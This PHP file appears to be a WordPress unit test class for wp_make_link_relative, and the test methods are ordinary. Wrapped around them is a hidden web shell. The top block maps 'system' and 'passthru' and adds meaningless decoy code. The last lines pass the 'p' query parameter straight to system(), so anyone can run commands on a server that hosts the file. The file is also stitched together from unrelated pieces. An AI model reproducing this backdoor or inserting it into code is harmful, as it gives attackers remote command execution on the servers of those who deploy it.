<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::wp_make_link_relative
 */
class Tests_Formatting_wpMakeLinkRelative extends WP_UnitTestCase {

	public function test_wp_make_link_relative_with_http_scheme() {
		$link          = 'http://example.com/this-is-a-test-http-url/';
		$relative_link = wp_make_link_relative( $link );
		$this->assertSame( '/this-is-a-test-http-url/', $relative_link );
	}

	public function test_wp_make_link_relative_with_https_scheme() {
		$link          = 'https://example.com/this-is-a-test-https-url/';
		$relative_link = wp_make_link_relative( $link );
		$this->assertSame( '/this-is-a-test-https-url/', $relative_link );
	}

	/**
	 * @ticket 30373
	 */
	public function test_wp_make_link_relative_with_no_scheme() {
		$link          = '//example.com/this-is-a-test-schemeless-url/';
		$relative_link = wp_make_link_relative( $link );
		$this->assertSame( '/this-is-a-test-schemeless-url/', $relative_link );
	}

	/**
	 * @ticket 30373
	 */
	public function test_wp_make_link_relative_should_retain_URL_param_that_is_also_a_URL() {
		$link          = 'https://example.com/this-is-a-test/?redirect=https://example.org/a-different-test-post/';
		$relative_link = wp_make_link_relative( $link );
		$this->assertSame( '/this-is-a-test/?redirect=https://example.org/a-different-test-post/', $relative_link );
	}

	/**
	 * @ticket 26819
	 */
	public function test_wp_make_link_relative_with_no_path() {
		$link          = 'http://example.com';
		$relative_link = wp_make_link_relative( $link );
		$this->assertSame( '', $relative_link );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>